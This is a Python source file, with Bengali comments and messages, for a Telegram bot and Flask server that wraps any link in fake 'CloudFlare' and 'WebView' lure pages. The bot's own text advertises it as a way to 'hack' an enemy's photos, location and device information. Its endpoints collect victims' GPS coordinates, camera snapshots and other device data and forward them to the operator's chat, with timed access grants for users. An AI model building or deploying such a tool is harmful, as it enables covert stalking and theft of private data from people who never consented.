import os
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from flask import Flask, request, render_template
import base64
import json
from threading import Thread
import time
import urllib.parse
from PIL import Image
import io

# আপনার বট টোকেন এবং অ্যাডমিনের ইউজার আইডি এখানে দিন
TELEGRAM_BOT_TOKEN = os.environ.get("bot")
OWNER_ID = 6246410156

# আপনার হোস্টিং URL এখানে দিন
HOST_URL = "https://your-app-name.onrender.com"

# অনুমোদিত ব্যবহারকারীদের ফাইল
USERS_FILE = 'users.json'
allowed_users = {}
start_time = time.time()

# লগিং সেটআপ
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# অনুমোদিত ব্যবহারকারীদের তালিকা লোড করা
def load_allowed_users():
    global allowed_users
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            allowed_users = json.load(f)
    else:
        allowed_users[str(OWNER_ID)] = {'expires': 'forever'}
        save_allowed_users()

# অনুমোদিত ব্যবহারকারীদের তালিকা সেভ করা
def save_allowed_users():
    with open(USERS_FILE, 'w') as f:
        json.dump(allowed_users, f, indent=4)

# ইউজার অনুমোদিত কিনা তা যাচাই করা
def is_allowed(user_id):
    user_id = str(user_id)
    if user_id == str(OWNER_ID):
        return True
    user = allowed_users.get(user_id)
    if not user:
        return False
    if user['expires'] == 'forever':
        return True
    return time.time() < float(user['expires'])

# টেলিগ্রাম বট কমান্ডগুলো
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_allowed(update.effective_user.id):
        await update.message.reply_text("দুঃখিত, এই বটটি ব্যবহারের জন্য আপনার অনুমতি নেই।")
        return
    await update.message.reply_text("আসসালামু আলাইকুম! আপনি এই বট ব্যবহার করে সামান্য একটি লিঙ্ক পাঠিয়ে আপনার শত্রুর ছবি, লোকেশন এবং তার ডিভাইসের বিভিন্ন তথ্য হ্যাক করে নিতে পারবেন।")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_allowed(update.effective_user.id):
        return
    await update.message.reply_text("এই বটের মাধ্যমে আপনি কেবল একটি সহজ লিঙ্ক পাঠিয়ে মানুষদের ট্র্যাক করতে পারবেন।\n\nপ্রথমে /create লিখে সেন্ড করুন, তারপর বট আপনার কাছে একটা লিঙ্ক চাইবে, আমি যেকেনো একটা ভিডিও এর লিঙ্ক দিয়ে দিবেন।\nআপনার থেকে লিঙ্ক পেলে বট আপনার লিঙ্কে ম্যালওয়ার বসিয়ে আপনাকে আবার ২ টা লিঙ্ক দিবে।")

async def create_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_allowed(update.effective_user.id):
        return
    await update.message.reply_text("🌐 আপনার লিঙ্কটি দিন")

async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_allowed(update.effective_user.id):
        return
    user_link = update.message.text
    if user_link.startswith(('http://', 'https://')):
        encoded_link = base64.b64encode(user_link.encode('utf-8')).decode('utf-8')
        user_id_encoded = base64.b64encode(str(update.effective_user.id).encode('utf-8')).decode('utf-8')
        
        c_url = f"{HOST_URL}/c/{user_id_encoded}/{encoded_link}"
        w_url = f"{HOST_URL}/w/{user_id_encoded}/{encoded_link}"
        
        message_text = f"নতুন লিঙ্কগুলি সফলভাবে তৈরি করা হয়েছে।\nURL: {user_link}\n\n✅আপনার লিঙ্কগুলো\n\n🌐 CloudFlare Page Link\n{c_url}\n\n🌐 WebView Page Link\n{w_url}"
        
        await update.message.reply_text(message_text)

    else:
        await update.message.reply_text("⚠️ দয়া করে একটি সঠিক লিঙ্ক দিন , লিঙ্কে অবশ্যই http অথবা https থাকতে হবে।")


async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।")
        return

    try:
        user_id_to_add = context.args[0]
        duration_str = context.args[1] if len(context.args) > 1 else 'forever'
        
        expires_at = 'forever'
        if duration_str != 'forever':
            value = int(duration_str[:-1])
            unit = duration_str[-1].lower()
            if unit == 'm':
                expires_at = time.time() + value * 60
            elif unit == 'h':
                expires_at = time.time() + value * 3600
            elif unit == 'd':
                expires_at = time.time() + value * 3600 * 24
            else:
                await update.message.reply_text("সঠিক ফরম্যাট: /allow <user_id> [সময় (যেমন: 30m, 2h, 7d)]")
                return

        allowed_users[user_id_to_add] = {'expires': expires_at}
        save_allowed_users()
        await update.message.reply_text(f"ইউজার {user_id_to_add} কে অনুমতি দেওয়া হয়েছে।")

    except (IndexError, ValueError):
        await update.message.reply_text("সঠিক ফরম্যাট: /allow <user_id> [সময়]")

async def disallow_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("দুঃখিত, শুধুমাত্র বটের অ্যাডমিন এই কমান্ডটি ব্যবহার করতে পারেন।")
        return
    try:
        user_id_to_remove = context.args[0]
        if user_id_to_remove in allowed_users:
            del allowed_users[user_id_to_remove]
            save_allowed_users()
            await update.message.reply_text(f"ইউজার {user_id_to_remove} কে তালিকা থেকে সরানো হয়েছে।")
        else:
            await update.message.reply_text("এই ইউজার অনুমোদিত তালিকায় নেই।")
    except (IndexError, ValueError):
        await update.message.reply_text("সঠিক ফরম্যাট: /disallow <user_id>")

async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uptime_seconds = time.time() - start_time
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await update.message.reply_text(f"বটটি চালু আছে {int(hours)} ঘন্টা, {int(minutes)} মিনিট, এবং {int(seconds)} সেকেন্ড ধরে।")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "crenew":
        await create_command(query, context)

# ফ্লাস্ক ওয়েব সার্ভার সেটআপ
app = Flask(__name__)

@app.route('/c/<path:path>/<path:uri>')
def cloudflare_page(path, uri):
    uid = base64.b64decode(path).decode('utf-8')
    url = base64.b64decode(uri).decode('utf-8')
    return render_template('cloudflare.html', uid=uid, url=url, a=HOST_URL)

@app.route('/w/<path:path>/<path:uri>')
def webview_page(path, uri):
    uid = base64.b64decode(path).decode('utf-8')
    url = base64.b64decode(uri).decode('utf-8')
    return render_template('webview.html', uid=uid, url=url, a=HOST_URL)

@app.route('/location', methods=['POST'])
def location():
    try:
        data = request.json
        uid = data.get('uid')
        lat = data.get('lat')
        lon = data.get('lon')
        acc = data.get('acc')
        
        user_id = base64.b64decode(uid).decode('utf-8')
        
        application.bot.send_location(chat_id=user_id, latitude=lat, longitude=lon)
        application.bot.send_message(chat_id=user_id, text=f"Latitude: {lat}\nLongitude: {lon}\nAccuracy: {acc} meters")
        
        return "Done", 200
    except Exception as e:
        logger.error(f"Location error: {e}")
        return "Error", 500

@app.route('/camsnap', methods=['POST'])
def camsnap():
    try:
        data = request.json
        uid = data.get('uid')
        img_base64 = data.get('img')

        if not uid or not img_base64:
            return "No data", 400

        user_id = base64.b64decode(uid).decode('utf-8')
        
        image_data = base64.b64decode(img_base64)
        
        application.bot.send_photo(chat_id=user_id, photo=io.BytesIO(image_data))

        return "Done", 200

    except Exception as e:
        logger.error(f"Error processing image: {e}")
        application.bot.send_message(chat_id=user_id, text="⚠️ দুঃখিত, ছবি প্রসেস করার সময় একটি সমস্যা হয়েছে।")
        return "Error", 500
        
@app.route('/', methods=['POST'])
def post_data():
    try:
        data = request.json
        uid = data.get('uid')
        victim_data = data.get('data')

        user_id = base64.b64decode(uid).decode('utf-8')
        
        application.bot.send_message(chat_id=user_id, text=victim_data)
        return "Done", 200
    except Exception as e:
        logger.error(f"Error posting data: {e}")
        return "Error", 500

# টেলিগ্রাম বট শুরু করা
def run_telegram_bot():
    load_allowed_users()
    global application
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("create", create_command))
    application.add_handler(CommandHandler("allow", allow_user))
    application.add_handler(CommandHandler("disallow", disallow_user))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
    application.add_handler(CallbackQueryHandler(button_handler))

    application.run_polling()

# দুটি থ্রেডে বট এবং ওয়েব সার্ভার চালানো
if __name__ == "__main__":
    bot_thread = Thread(target=run_telegram_bot)
    bot_thread.start()

    app.run(port=5000)